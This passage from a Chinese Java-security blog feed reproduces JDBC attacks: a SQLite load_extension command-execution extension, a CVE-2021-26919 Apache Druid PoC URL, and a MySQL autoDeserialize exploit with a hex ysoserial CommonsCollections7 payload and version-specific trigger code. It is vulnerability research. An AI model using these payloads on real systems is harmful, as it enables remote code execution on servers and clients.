connection.createStatement();</span><br><span class="line">    statement.execute(<span class="string">&quot;SELECT load_extension(&#x27;/var/folders/vw/5c9ynmt1277dbnmrxjq8hzn40000gq/T/sqlite-jdbc-tmp-264346288.db&#x27;)&quot;</span>);</span><br><span class="line"></span><br><span class="line">    statement.close();</span><br><span class="line">    connection.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>gcc -g -fPIC -shared sq2.c -o sq2.dylib</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sqlite3ext.h&gt; /* Do not use &lt;sqlite3.h&gt;! */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">SQLITE_EXTENSION_INIT1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32</span></span><br><span class="line">__declspec(dllexport)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sqlite3_extension_init</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  sqlite3 *db, </span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">char</span> **pzErrMsg, </span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> sqlite3_api_routines *pApi</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> rc = SQLITE_OK;</span><br><span class="line">  SQLITE_EXTENSION_INIT2(pApi);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">char</span> *argv[]=&#123;<span class="string">&quot;open&quot;</span>,<span class="string">&quot;-a&quot;</span>,<span class="string">&quot;Calculator&quot;</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">  <span class="keyword">char</span> *envp[]=&#123;<span class="number">0</span>,<span class="literal">NULL</span>&#125;;</span><br><span class="line">  execv(<span class="string">&quot;/usr/bin/open&quot;</span>, argv);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本节探讨了下在jdbc url可控情况下，因为内存数据库Server&amp;Client就是当前同一台机器，寻找内存数据库的利用点。思路有两点：</p><ul><li>利用数据库特性，执行系统命令/写文件，在Server上RCE</li><li>利用反序列化，构造恶意Server，在Client上RCE</li></ul><p>目前除了H2，其他还是比较困难的，未完待续。。。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://kbase.ayoma.me/databases/">Security Knowledge Base/ Databases</a></li><li>[2] <a href="https://github.com/Al1ex/CVE-2020-36179">Al1ex/CVE-2020-36179</a></li><li>[3] <a href="https://www.anquanke.com/post/id/210849">F5 BIG-IP hsqldb（CVE-2020-5902）漏洞踩坑分析</a></li><li>[4] <a href="https://github.com/Critical-Start/Team-Ares/tree/master/CVE-2020-5902">Proof of Concept for CVE-2020-5902</a></li><li>[5] <a href="https://xz.aliyun.com/t/9162">HSQLDB 安全测试指南（浅蓝大佬）</a></li><li>[6] <a href="http://hsqldb.org/doc/2.0/guide/dbproperties-chapt.html">Chapter 14. Properties</a></li><li>[7] <a href="https://cert.360.cn/report/detail?id=55654da3c33b4c832167a8902f14cd4f">CVE-2020-5902: F5 BIG-IP 远程代码执行漏洞分析</a></li><li>[8] <a href="https://mp.weixin.qq.com/s/yvEHxhsedSwB12PTcQ5aRg">java恶意样本调试指南</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;继续讨论讨论在jdbc url可控情况下，有哪下攻击手法？&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;攻击client思路，典型的就是mysql client，前面讲过&lt;/li&gt;
&lt;li&gt;攻击server思路，内存数据库就是当前server，发现相关介绍文章都比较散，这里尝试探索总结下，看看能不能发现新的姿势&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;攻击内存数据库Server&quot;&gt;&lt;a href=&quot;#攻击内存数据库Server&quot; class=&quot;headerlink&quot; title=&quot;攻击内存数据库Server&quot;&gt;&lt;/a&gt;攻击内存数据库Server&lt;/h1&gt;&lt;h2 id=&quot;H2&quot;&gt;&lt;a href=&quot;#H2&quot; class=&quot;headerlink&quot; title=&quot;H2&quot;&gt;&lt;/a&gt;H2&lt;/h2&gt;&lt;p&gt;pom依赖&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;com.h2database&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;groupId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;h2&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;artifactId&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;1.4.199&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;version&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;dependency&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="Jdbc" scheme="http://m0d9.me/tags/Jdbc/"/>
    
    <category term="H2" scheme="http://m0d9.me/tags/H2/"/>
    
    <category term="HSQLDB" scheme="http://m0d9.me/tags/HSQLDB/"/>
    
  </entry>
  
  <entry>
    <title>Apache Druid CVE-2021-26919 漏洞分析</title>
    <link href="http://m0d9.me/2021/04/21/Apache-Druid-CVE-2021-26919-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://m0d9.me/2021/04/21/Apache-Druid-CVE-2021-26919-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-04-21T13:08:00.000Z</published>
    <updated>2021-04-22T07:05:40.589Z</updated>
    
    <content type="html"><![CDATA[<p>CVE-2021-26919是一个jdbc 反序列化类型漏洞，用作之前两篇jdbc mysql学习的练手，分析分析。</p><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>已知是jdbc mysql反序列化的问题，可以直接看看官方的修复</p><p><a href="https://github.com/apache/druid/compare/druid-0.20.1...druid-0.20.2">https://github.com/apache/druid/compare/druid-0.20.1...druid-0.20.2</a><br><img src="/images/pasted-129.png" alt="upload successful"></p><p>具体在这个commit里<br><a href="https://github.com/apache/druid/commit/48953e3508967f5156c69676432b5d4dd25ea678">https://github.com/apache/druid/commit/48953e3508967f5156c69676432b5d4dd25ea678</a></p><p>代码就不贴了，主要功能是设置了jdbc:mysql &amp; jdbc:postgresql两类driver和对应的参数白名单</p><a id="more"></a><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>知道漏洞类型，剩下就是找漏洞触发点了</p><h3 id="jdbc触发点"><a href="#jdbc触发点" class="headerlink" title="jdbc触发点"></a>jdbc触发点</h3><p>最好的方式是多读官方文档，在lookup相关功能文档上找到<br><a href="https://druid.apache.org/docs/0.19.0/development/extensions-core/druid-lookups.html#polling-lookup">https://druid.apache.org/docs/0.19.0/development/extensions-core/druid-lookups.html#polling-lookup</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;pollingLookup&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;pollPeriod&quot;</span>: <span class="string">&quot;PT10M&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;dataFetcher&quot;</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;jdbcDataFetcher&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;connectorConfig&quot;</span>: <span class="string">&quot;jdbc://mysql://localhost:3306/my_data_base&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;table&quot;</span>: <span class="string">&quot;lookup_table_name&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;keyColumn&quot;</span>: <span class="string">&quot;key_column_name&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;valueColumn&quot;</span>: <span class="string">&quot;value_column_name&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;cacheFactory&quot;</span>:</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;onHeapPolling&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相关的，在web console上也找到对应的功能点</p><p><img src="/images/pasted-130.png" alt="upload successful"></p><h3 id="mysql-connector-java"><a href="#mysql-connector-java" class="headerlink" title="mysql-connector-java"></a>mysql-connector-java</h3><p><a href="https://druid.apache.org/docs/latest/development/extensions-core/lookups-cached-global.html#introspection">https://druid.apache.org/docs/latest/development/extensions-core/lookups-cached-global.html#introspection</a></p><blockquote><p>If using JDBC, you will need to add your database’s client JAR files to the extension’s directory. For Postgres, the connector JAR is already included. For MySQL, you can get it from <a href="https://dev.mysql.com/downloads/connector/j/">https://dev.mysql.com/downloads/connector/j/</a>. Copy or symlink the downloaded file to extensions/druid-lookups-cached-global under the distribution root directory.</p></blockquote><ol><li>需要将mysql-connector-java sdk拷贝至extensions/druid-lookups-cached-global</li><li>而且需要启动druid-lookups-cached-global组件，具体操作为在common.runtime.properties文件中修改druid.extensions.loadList，增加”druid-lookups-cached-global”扩展功能</li></ol><h3 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h3><p>lib目录中找到几个常见gadgets</p><ol><li><p>commons-collections</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">commons-collections-3.2.2.jar</span><br><span class="line">commons-collections4-4.2.jar</span><br></pre></td></tr></table></figure><p> 实际不可用，利用条件为cc&lt;=3.2.1 或cc4=4.0，具体可以看ysoserial</p></li><li><p>commons-beanutils</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commons-beanutils-1.9.4.jar</span><br></pre></td></tr></table></figure><p> 虽然ysoserial写的是1.9.2，实测1.9.4也可以利用</p></li></ol><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;maxAllowedPacket=65535&quot;</span></span><br><span class="line">user =<span class="string">&quot;cb1&quot;</span></span><br><span class="line">password=<span class="string">&quot;password&quot;</span></span><br></pre></td></tr></table></figure><p>需要注意的是，提交之后，需要等一两分钟之后，才会触发jdbc连接</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文简单复现了CVE-2021-26919漏洞，本以为很简单，结果还是用了大半天，踩了一些低级的坑，教训是多看文档、测试排查按最小变量来、多看程序输出日志。。。</p><p>总的来说这个漏洞利用场景比较鸡肋，需要在开启jdbc功能的前提下（sdk拷贝&amp;配置文件中的扩展开启）。官方的修复也是彻底，直接通过白名单做了限制，连postgresql也一并处理了，难道postgresql也存在利用点不成？</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>[1] <a href="https://help.aliyun.com/noticelist/articleid/1060822985.html?spm=a2c4g.789213612.n2.10.7b5a6141soZJmh">【漏洞预警】Apache Druid 远程代码执行漏洞（CVE-2021-26919）</a></li><li>[2] <a href="(https://paper.seebug.org/1242/#commonscollections-2">Java安全之反序列化篇-URLDNS&amp;Commons Collections 1-7反序列化链分析</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;CVE-2021-26919是一个jdbc 反序列化类型漏洞，用作之前两篇jdbc mysql学习的练手，分析分析。&lt;/p&gt;
&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;已知是jdbc mysql反序列化的问题，可以直接看看官方的修复&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/apache/druid/compare/druid-0.20.1...druid-0.20.2&quot;&gt;https://github.com/apache/druid/compare/druid-0.20.1...druid-0.20.2&lt;/a&gt;&lt;br&gt;&lt;img src=&quot;/images/pasted-129.png&quot; alt=&quot;upload successful&quot;&gt;&lt;/p&gt;
&lt;p&gt;具体在这个commit里&lt;br&gt;&lt;a href=&quot;https://github.com/apache/druid/commit/48953e3508967f5156c69676432b5d4dd25ea678&quot;&gt;https://github.com/apache/druid/commit/48953e3508967f5156c69676432b5d4dd25ea678&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;代码就不贴了，主要功能是设置了jdbc:mysql &amp;amp; jdbc:postgresql两类driver和对应的参数白名单&lt;/p&gt;</summary>
    
    
    
    <category term="Java安全" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞分析" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="Druid" scheme="http://m0d9.me/tags/Druid/"/>
    
    <category term="Apache" scheme="http://m0d9.me/tags/Apache/"/>
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Jdbc 碎碎念二：MySQL 反序列化</title>
    <link href="http://m0d9.me/2021/04/20/Jdbc-%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%BA%8C%EF%BC%9AMySQL-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://m0d9.me/2021/04/20/Jdbc-%E7%A2%8E%E7%A2%8E%E5%BF%B5%E4%BA%8C%EF%BC%9AMySQL-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-04-20T08:08:00.000Z</published>
    <updated>2021-04-21T12:52:26.359Z</updated>
    
    <content type="html"><![CDATA[<p>参考【1】中四哥已经讲的很全面也很详细了，简单记录下复现过程吧</p><h2 id="MySQL-反序列化"><a href="#MySQL-反序列化" class="headerlink" title="MySQL 反序列化"></a>MySQL 反序列化</h2><h3 id="autoDeserialize"><a href="#autoDeserialize" class="headerlink" title="autoDeserialize"></a>autoDeserialize</h3><p><img src="/images/pasted-125.png" alt="upload successful"></p><p>如解释，mysql client会自动反序列化server端传回的BLOB类型</p><a id="more"></a><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><h4 id="手动触发"><a href="#手动触发" class="headerlink" title="手动触发"></a>手动触发</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> test.eviltable</span><br><span class="line">(</span><br><span class="line"><span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">evil_2  <span class="built_in">blob</span>,</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> @obj=<span class="number">0xaced0005737200136a6176612e7574696c2e486173687461626c6513bb0f25214ae4b803000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000877080000000b000000027372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4f626a6563743b7870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001700000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e00177371007e000f7571007e001400000002707571007e001400000000740006696e766f6b657571007e001700000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00147371007e000f757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000e746f756368202f746d702f636337740004657865637571007e00170000000171007e001c7371007e000a737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c77080000001000000001740002797971007e002f787871007e002f7371007e000271007e00077371007e00303f4000000000000c770800000010000000017400027a5a71007e002f78787371007e002d0000000278</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> test.eviltable(<span class="string">`evil_2`</span>) <span class="keyword">VALUES</span> (@obj);</span><br></pre></td></tr></table></figure><!--more--><p>其中@obj取值</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections7 <span class="string">&quot;touch /tmp/cc7&quot;</span> | xxd -ps -c 200 | tr -d <span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure><p>触发代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ResultSet rs = stmt.executeQuery(<span class="string">&quot;select evil_2 from eviltable limit 1;&quot;</span>);</span><br><span class="line">rs.next();</span><br><span class="line">rs.getObject(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>误区：想当然以为只要是BLOB类型的字段就会被自动反序列化，其实不然，需要满足以下两个条件</p><ol><li>autoDeserialize 为True</li><li>主动调用com.mysql.cj.jdbc.result.ResultSetImpl#getObject，进行反序列化</li></ol><h3 id="ServerStatusDiffInterceptor-amp-detectCustomCollations触发调用链"><a href="#ServerStatusDiffInterceptor-amp-detectCustomCollations触发调用链" class="headerlink" title="ServerStatusDiffInterceptor&amp; detectCustomCollations触发调用链"></a>ServerStatusDiffInterceptor&amp; detectCustomCollations触发调用链</h3><p>手动触发场景下实际需要控制：</p><ol><li>jdbc url，也就是evil mysql server</li><li>代码需要getObject，这点显然不可能</li></ol><p>那么需要找到利用链，解决触发getObject。可以看看四哥在参考【1】中总结的漏洞历史，总的来说有公开两种通用的利用方式</p><ul><li>ServerStatusDiffInterceptor</li><li>detectCustomCollations</li></ul><p>四哥和fnmsd的文章已经讲的很清楚了，这里直接引用他们的测试结果</p><h4 id="ServerStatusDiffInterceptor"><a href="#ServerStatusDiffInterceptor" class="headerlink" title="ServerStatusDiffInterceptor"></a>ServerStatusDiffInterceptor</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * ServerStatusDiffInterceptor触发</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 8.x:jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 8.0.14 测试成功</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ServerStatusDiffInterceptorTest8_x</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6.x(属性名不同):jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 6.0.5 测试通过</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ServerStatusDiffInterceptorTest6_x</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.11及以上的5.x版本（包名没有了cj）:jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_JRE8u20_calc</span></span><br><span class="line"><span class="comment">// 5.1.19 测试成功</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ServerStatusDiffInterceptorTest5_1_11TO5_x</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5.1.10及以下的5.1.X版本：同上，但是需要连接后执行查询。</span></span><br><span class="line"><span class="comment">// 5.1.10 测试成功</span></span><br><span class="line"><span class="comment">// @<span class="doctag">TODO:</span>5.1.9 测试失败</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ServerStatusDiffInterceptorTest5_xTO5_1_10</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    Class.forName(JDBC_DRIVER);</span><br><span class="line">    String url = <span class="string">&quot;jdbc:mysql://localhost:3307/?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>;</span><br><span class="line">    Connection connection = DriverManager.getConnection(url, <span class="string">&quot;cc7&quot;</span>, <span 